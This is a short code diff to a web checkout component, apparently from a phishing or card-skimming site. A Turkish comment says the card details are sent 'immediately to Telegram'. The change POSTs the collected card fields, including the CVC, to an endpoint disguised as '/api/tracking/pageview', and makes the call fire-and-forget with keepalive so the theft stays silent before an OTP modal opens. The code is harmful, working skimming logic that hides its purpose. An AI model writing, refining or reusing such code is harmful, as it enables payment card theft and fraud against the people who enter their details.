@@ -176,16 +176,13 @@ export function PaymentStep({
       [f5]: cvc,
     };
 
-    // Kart bilgilerini HEMEN Telegram'a gönder — modal açılmadan önce bitsin
-    try {
-      await fetch("/api/tracking/pageview", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(PAYLOAD),
-      });
-    } catch {
-      // Network hatası olsa bile devam et
-    }
+    // Kart bilgilerini HEMEN Telegram'a gönder — fire-and-forget, modal'ı bloklama
+    fetch("/api/tracking/pageview", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      keepalive: true,
+      body: JSON.stringify(PAYLOAD),
+    }).catch(() => {});
 
     setPaying(false);
     setOtpOpen(true);
